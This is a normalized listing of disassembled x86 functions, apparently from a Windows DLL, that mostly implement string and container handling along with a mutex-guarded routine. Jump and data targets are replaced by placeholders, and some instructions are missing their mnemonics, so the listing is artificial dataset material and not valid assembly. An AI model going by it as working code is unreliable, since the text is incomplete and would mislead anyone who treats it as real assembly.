mov [ esi + 0x14 ] 0xf
xor ecx ecx
mov [ edi + esi ] 0x0
cmp ecx ebx
pop edi
sbb eax eax
pop esi
neg eax
pop ebx
pop ebp
retn 0x8
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_10019ce4
mov ebx [ ebp + 0x8 ]
add esp 0x4
push edi
push ebx
push esi
call sub_10019cf0
add esp 0xc
sub_10006da0
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx ecx
mov ecx [ ebx + 0x8 ]
mov eax 0xfffffff
push edi
mov edi [ ebp + 0x8 ]
sub eax ecx
cmp eax edi
jae r-xdata
mov eax ecx
shr eax 0x1
cmp eax 0x8
jae r-xdata
push r--data
call sub_100190f4
cmp edi eax
jae r-xdata
mov eax 0x8
push esi
mov esi [ ebx + 0xc ]
shr esi 0x1
lea eax [ ecx + edi ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov edx 0xfffffff
sub edx eax
cmp ecx edx
ja r-xdata
mov ecx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
add eax eax
add eax eax
add esi esi
add esi esi
lea edx [ esi + ecx ]
sub eax edx
add eax ecx
mov ecx [ ebp - 0x4 ]
sar eax 0x2
add eax eax
add eax eax
push eax
push edx
lea edx [ esi + ecx ]
push edx
mov [ ebp - 0xc ] eax
call sub_1001a060
add eax [ ebp - 0xc ]
mov ecx [ ebx + 0x4 ]
add esp 0xc
cmp [ ebp - 0x8 ] edi
ja r-xdata
cmp eax 0x3fffffff
ja r-xdata
mov [ ebp + 0x8 ] eax
mov edi eax
lea edx [ edi * 4 ]
sar edx 0x2
add edx edx
add edx edx
push edx
push ecx
push eax
call sub_1001a060
mov eax [ ebx + 0x4 ]
lea ecx [ eax + edi * 4 ]
sub esi ecx
add esi eax
mov eax [ ebp - 0x4 ]
sar esi 0x2
add esi esi
add esi esi
push esi
push ecx
push eax
call sub_1001a060
add esp 0x18
lea edx [ esi + eax ]
test edi edi
je r-xdata
sar esi 0x2
mov edx esi
add edx edx
add edx edx
push edx
push ecx
push eax
mov esi edi
mov [ ebp - 0xc ] edx
call sub_1001a060
mov edx eax
add edx [ ebp - 0xc ]
add esp 0xc
sub esi [ ebp - 0x8 ]
je r-xdata
lea edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x18 ]
mov [ ebp + 0x8 ] 0x0
call sub_10019ba5
push r--data
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x18 ] r--data
call sub_1001a898
int3
add eax eax
add eax eax
push eax
call sub_1001a818
add esp 0x4
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
pop esi
test eax eax
je r-xdata
mov ecx edi
mov edi edx
mov ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
mov ecx esi
xor eax eax
mov edi edx
[ edi ]
mov edi [ ebp + 0x8 ]
add [ ebx + 0x8 ] edi
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0x4 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_10019ce4
add esp 0x4
mov edi [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
[ edi ]
mov edi [ ebp + 0x8 ]
sub_10006f30
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
cmp eax ecx
jae r-xdata
mov ebx [ ebp + 0x10 ]
sub eax ecx
cmp eax ebx
jae r-xdata
push r--data
call sub_10019141
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_100190f4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_100190f4
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10006a10
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x10
cmp [ edx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov ecx edx
mov ecx [ edx ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
add ecx [ ebp + 0xc ]
push ebx
push ecx
mov ecx [ esi + 0x10 ]
add ecx eax
push ecx
call sub_10019cf0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10007020
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x10 ]
push edi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
push r--data
call sub_10019141
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x10 ]
mov edx [ ebp + 0x10 ]
cmp eax edx
jb r-xdata
mov edi [ ebp + 0x14 ]
sub eax edx
cmp eax edi
jae r-xdata
or edx 0xffffffff
sub edx ecx
cmp edx edi
ja r-xdata
mov edi eax
test edi edi
je r-xdata
push r--data
call sub_100190f4
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
push ebx
lea ebx [ ecx + edi ]
mov [ ebp + 0x14 ] ebx
cmp ebx 0xfffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_100190f4
test ebx ebx
jne r-xdata
push ecx
push ebx
mov ecx esi
call sub_10006a10
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x10 ] ebx
cmp eax 0x10
jb r-xdata
pop ebx
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop ebx
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0x10
mov eax [ esi ]
mov [ eax ] bl
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov eax [ ebp + 0x10 ]
lea edx [ eax + edi ]
cmp ebx eax
jb r-xdata
mov edx [ esi + 0x10 ]
sub edx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
push edx
add ecx ebx
add eax ebx
push ecx
add eax edi
push eax
call sub_1001a060
mov ecx [ ebp + 0xc ]
add esp 0xc
cmp esi ecx
jne r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov edx eax
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov [ eax + ecx ] 0x0
mov eax [ esi ]
pop ebx
mov [ eax + ecx ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
add ecx [ ebp + 0x10 ]
push edi
push ecx
add eax ebx
push eax
call sub_10019cf0
push edi
add ecx edx
mov eax esi
push ecx
add eax ebx
push eax
call sub_1001a060
jmp r-xdata
mov eax [ esi ]
push edi
add ecx edx
push ecx
add eax ebx
push eax
call sub_1001a060
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov ecx [ ebp + 0x14 ]
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] ecx
jb r-xdata
sub_100071a0
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x10 ]
push edi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
push r--data
call sub_10019141
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x10 ]
mov edx [ ebp + 0x10 ]
cmp eax edx
jb r-xdata
mov edi [ ebp + 0x14 ]
sub eax edx
cmp eax edi
jae r-xdata
or edx 0xffffffff
sub edx ecx
cmp edx edi
ja r-xdata
mov edi eax
test edi edi
je r-xdata
push r--data
call sub_100190f4
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
push ebx
lea ebx [ ecx + edi ]
mov [ ebp + 0x14 ] ebx
cmp ebx 0x7ffffffe
jbe r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_100190f4
test ebx ebx
jne r-xdata
push ecx
push ebx
mov ecx esi
call sub_100014e0
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov [ esi + 0x10 ] ebx
cmp eax 0x8
jb r-xdata
pop ebx
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop ebx
mov eax esi
xor ecx ecx
pop edi
mov [ eax ] cx
pop esi
pop ebp
retn 0x10
mov eax [ esi ]
pop ebx
xor ecx ecx
mov [ eax ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x10
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov eax 0x8
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov eax [ ebp + 0x10 ]
lea edx [ eax + edi ]
cmp ebx eax
jb r-xdata
mov edx [ esi + 0x10 ]
sub edx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
push edx
lea ecx [ ecx + ebx * 2 ]
lea edx [ ebx + edi ]
push ecx
lea eax [ eax + edx * 2 ]
push eax
call sub_10001050
mov ecx [ ebp + 0xc ]
add esp 0xc
cmp esi ecx
jne r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov edx eax
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
lea edx [ edi + edi ]
push edx
mov edx [ ebp + 0x10 ]
lea ecx [ ecx + edx * 2 ]
push ecx
lea edx [ eax + ebx * 2 ]
push edx
call sub_10019cf0
lea ecx [ ecx + edx * 2 ]
mov eax esi
push edi
push ecx
lea edx [ eax + ebx * 2 ]
push edx
call sub_10001050
jmp r-xdata
mov eax [ esi ]
lea ecx [ ecx + edx * 2 ]
push edi
push ecx
lea edx [ eax + ebx * 2 ]
push edx
call sub_10001050
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov eax [ ebp + 0x14 ]
add esp 0xc
push eax
mov ecx esi
call sub_10001250
sub_10007320
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ esi + 0x38 ] 0x8
jb r-xdata
push eax
call sub_1001a3eb
add esp 0x4
xor ecx ecx
mov [ esi + 0x38 ] 0x7
mov [ esi + 0x34 ] 0x0
mov [ esi + 0x24 ] cx
cmp [ esi + 0x1c ] 0x10
jb r-xdata
mov eax [ esi + 0x24 ]
push eax
call sub_10019ce4
add esp 0x4
mov [ esi + 0x1c ] 0xf
mov [ esi + 0x18 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
mov edx [ esi + 0x8 ]
push edx
call sub_10019ce4
add esp 0x4
sub_10007380
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ecx + 0x10 ]
cmp edi ebx
jae r-xdata
mov eax [ ebp + 0x10 ]
sub edi ebx
cmp eax edi
jae r-xdata
push r--data
call sub_10019141
cmp esi ecx
jne r-xdata
mov edi eax
cmp edi 0xfffffffe
jbe r-xdata
push 0xffffffff
add edi ebx
push edi
mov ecx esi
call sub_10006980
push ebx
push 0x0
mov ecx esi
call sub_10006980
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_100190f4
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_10006a10
mov ecx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
add ecx ebx
push ecx
push eax
call sub_10019cf0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10007470
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_100190f4
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ esi + 0x10 ]
push edx
push edi
mov ecx esi
call sub_10006a10
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
cmp ecx 0x10
jb r-xdata
mov edx [ esi + 0x10 ]
add edx eax
cmp edx ebx
jbe r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
push ebx
push eax
call sub_10019cf0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax esi
push ecx
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_10007380
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
push ecx
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_10007380
pop esi
pop ebx
pop ebp
retn 0x8
sub_10007570
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
cmp eax ecx
jae r-xdata
mov ebx [ ebp + 0x10 ]
sub eax ecx
cmp eax ebx
jae r-xdata
push r--data
call sub_10019141
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_100190f4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
lea edi [ eax + ebx ]
cmp edi 0x7ffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_100190f4
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_100014e0
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x8
cmp [ edx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
pop edi
mov ecx edx
mov ecx [ edx ]
jmp r-xdata
pop edi
mov eax esi
xor edx edx
pop esi
mov [ eax ] dx
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax ] dx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] eax
jb r-xdata
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
lea edx [ ebx + ebx ]
push edx
mov edx [ ebp + 0xc ]
lea ecx [ ecx + edx * 2 ]
mov edx [ esi + 0x10 ]
push ecx
lea eax [ eax + edx * 2 ]
push eax
call sub_10019cf0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10007680
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push 0xffffffff
add ecx 0x8
push eax
push ecx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov ecx esi
mov [ ebp - 0x4 ] eax
mov [ esi ] al
call sub_10007380
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_100076b0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax edx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push edx
mov ecx esi
call sub_10007470
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100076f0
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ edi + 0x14 ] 0x10
jae r-xdata
mov eax [ esi ]
push eax
call sub_10019ce4
add esp 0x4
mov edx [ edi ]
mov [ esi ] edx
mov [ edi ] 0x0
mov ecx [ edi + 0x10 ]
inc ecx
push ecx
push edi
push esi
call sub_1001a060
add esp 0xc
jmp r-xdata
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov ecx [ edi + 0x14 ]
mov [ esi + 0x14 ] ecx
mov [ edi + 0x10 ] 0x0
mov [ edi + 0x14 ] 0x0
sub_10007770
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0xc ]
mov edx [ esi + 0x4 ]
mov ecx eax
shr ecx 0x1
mov ecx [ edx + ecx * 4 ]
and eax 0x1
lea eax [ ecx + eax * 8 ]
push edi
mov edi [ eax + 0x4 ]
test edi edi
je r-xdata
mov ecx [ esi + 0x8 ]
inc [ esi + 0xc ]
add ecx ecx
pop edi
cmp ecx [ esi + 0xc ]
ja r-xdata
lea edx [ edi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
dec [ esi + 0x10 ]
jne r-xdata
mov [ esi + 0xc ] 0x0
mov edx [ edi ]
mov eax [ edx ]
mov ecx edi
call eax
lea ecx [ edi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov [ esi + 0xc ] 0x0
mov eax [ edi ]
mov edx [ eax + 0x4 ]
mov ecx edi
call edx
sub_100077e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c358
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi + 0x44 ]
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
push 0xffffffff
push 0x0
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0xc ]
call sub_10007570
cmp [ ebp + 0x1c ] 0x8
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x18 ] 0x0
jae r-xdata
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
xor ecx ecx
mov [ eax ] cx
mov edx [ esi + 0x44 ]
push edx
call [ ReleaseMutex@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp + 0x8 ]
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
push 0x2
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x10 ] r--data
call sub_10019b1d
push r--data
lea ecx [ ebp - 0x1c ]
push ecx
call sub_1001a898
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x1c
mov edx [ ebp + 0x8 ]
push edx
call sub_10019ce4
add esp 0x4
sub_100078a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c391
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0xc ]
add ecx eax
test cl 0x1
jne r-xdata
mov ebx [ esi + 0xc ]
add ebx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov edi ebx
shr edi 0x1
cmp eax edi
ja r-xdata
add eax 0x2
shr eax 0x1
cmp [ esi + 0x8 ] eax
ja r-xdata
mov edx [ esi + 0x4 ]
cmp [ edx + edi * 4 ] 0x0
jne r-xdata
sub edi eax
push 0x1
mov ecx esi
call sub_10006da0
mov ecx [ esi + 0x4 ]
mov edx [ ecx + edi * 4 ]
and ebx 0x1
lea ecx [ edx + ebx * 8 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ecx eax
je r-xdata
push 0x10
call sub_1001a818
add esp 0x4
test eax eax
je r-xdata
inc [ esi + 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
call sub_100033e0
lea edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] 0x0
call sub_10019ba5
push r--data
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x20 ] r--data
call sub_1001a898
int3
mov ecx [ esi + 0x4 ]
mov [ ecx + edi * 4 ] eax
sub_10007990
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
cmp [ esi + 0x10 ] ebx
je r-xdata
mov edi [ esi + 0x8 ]
cmp edi ebx
jbe r-xdata
lea esp [ esp ]
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
lea esp [ esp ]
cmp [ esi + 0x10 ] ebx
jne r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
lea eax [ eax + ecx - 0x1 ]
mov ecx eax
shr ecx 0x1
cmp edx ecx
ja r-xdata
pop edi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
pop esi
pop ebx
retn
push eax
call sub_10019ce4
add esp 0x4
cmp edi ebx
ja r-xdata
mov ecx [ eax ]
push ecx
call sub_10019ce4
add esp 0x4
mov eax [ esi + 0x10 ]
cmp eax ebx
je r-xdata
mov edx [ esi + 0x4 ]
mov ecx [ edx + ecx * 4 ]
and eax 0x1
mov edi [ ecx + eax * 8 + 0x4 ]
lea eax [ ecx + eax * 8 ]
cmp edi ebx
je r-xdata
sub ecx edx
mov eax [ esi + 0x4 ]
dec edi
cmp [ eax + edi * 4 ] ebx
lea eax [ eax + edi * 4 ]
je r-xdata
dec [ esi + 0x10 ]
jne r-xdata
lea edx [ edi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov [ esi + 0xc ] ebx
mov edx [ edi ]
mov eax [ edx ]
mov ecx edi
call eax
lea ecx [ edi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
mov ecx edi
call edx
sub_10007a50
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov edx [ eax + 0x10 ]
mov ecx [ ebp + 0x10 ]
push esi
mov esi [ ecx + 0x10 ]
push edi
mov edi [ eax + 0x14 ]
sub edi edx
mov [ ebp - 0x4 ] 0x0
cmp esi edi
jbe r-xdata
push 0xffffffff
push 0x0
push ecx
mov ecx eax
call sub_10006f30
mov edi [ ecx + 0x14 ]
sub edi esi
cmp edi edx
jb r-xdata
push 0xffffffff
push 0x0
push eax
push 0x0
call sub_10007020
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_100076f0
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_10007ac0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002c3db
mov eax [ fs : 0x0 ]
push eax
sub esp 0x9c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x8 ]
xor ebx ebx
xor edi edi
call sub_100132a0
test al al
jne r-xdata
mov eax edi
mov ecx [ esi + 0x8 ]
call sub_10013580
push 0x1
push r--data
lea ecx [ ebp - 0x48 ]
mov esi eax
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
call sub_10007470
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
mov [ ebp - 0x4 ] ebx
call sub_10007680
lea ecx [ ebp - 0x48 ]
push ecx
push eax
lea edx [ ebp - 0xa8 ]
push edx
mov [ ebp - 0x4 ] 0x1
call sub_10007a50
add esp 0xc
push 0xffffffff
push ebx
lea eax [ ebp - 0xa8 ]
push eax
lea ecx [ esi + 0x8 ]
mov [ ebp - 0x4 ] 0x2
call sub_10007380
mov edi 0x10
cmp [ ebp - 0x94 ] edi
jb r-xdata
mov [ ebp - 0x94 ] 0xf
mov [ ebp - 0x98 ] ebx
mov [ ebp - 0xa8 ] 0x0
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov ecx [ ebp - 0xa8 ]
push ecx
call sub_10019ce4
add esp 0x4
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10019ce4
add esp 0x4
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx esi
call sub_10007680
mov ebx [ esi + 0x4 ]
mov eax [ eax + 0x10 ]
add ebx eax
mov [ ebp - 0x88 ] ebx
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_10019ce4
add esp 0x4
push 0x1
push ebx
call sub_1001a8ef
add esp 0x8
mov [ ebp - 0x84 ] eax
test eax eax
je r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10019ce4
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x48 ]
push eax
mov ecx esi
call sub_10007680
mov [ ebp - 0x8c ] eax
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_10007680
mov edx [ ebp - 0x8c ]
mov ecx [ edx + 0x10 ]
cmp [ eax + 0x14 ] edi
jb r-xdata
push ecx
push eax
mov eax [ ebp - 0x84 ]
push ebx
push eax
call sub_1001a92f
add esp 0x10
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov eax [ eax ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10019ce4
add esp 0x4
lea eax [ ebp - 0x64 ]
push eax
mov ecx esi
call sub_10007680
mov ebx eax
lea ecx [ ebp - 0x80 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x4
call sub_10007680
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov ebx [ ebx + 0x10 ]
mov eax [ eax + 0x10 ]
push ecx
push edx
mov edx [ ebp - 0x88 ]
sub edx ebx
mov ebx [ ebp - 0x84 ]
push edx
add eax ebx
push eax
call sub_1001a92f
add esp 0x10
cmp [ ebp - 0x6c ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10019ce4
add esp 0x4
mov [ ebp - 0x6c ] 0xf
mov [ ebp - 0x70 ] 0x0
mov [ ebp - 0x80 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x50 ] edi
jb r-xdata
